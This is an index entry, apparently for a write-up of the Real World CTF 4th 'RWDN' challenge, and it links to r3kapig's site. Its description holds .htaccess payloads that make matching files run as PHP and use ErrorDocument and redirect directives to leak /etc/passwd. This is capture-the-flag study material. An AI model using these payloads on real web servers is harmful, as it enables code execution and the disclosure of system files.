---
title: "Real World CTF 4th - RWDN"
description: "
.htaccess

set handler

<FilesMatch \"kai\">
SetHandler application/x-httpd-php
</FilesMatch>


read file

ErrorDocument 404 %{file:/etc/passwd}
redirect permanent \"/%{BASE64:%{FILE:/etc/passwd}}\"
Example: 



"
external_category: "Miscellaneous"
---[Visit Website](https://r3kapig.com/writeup/20220125-rwctf4/#rwdn)

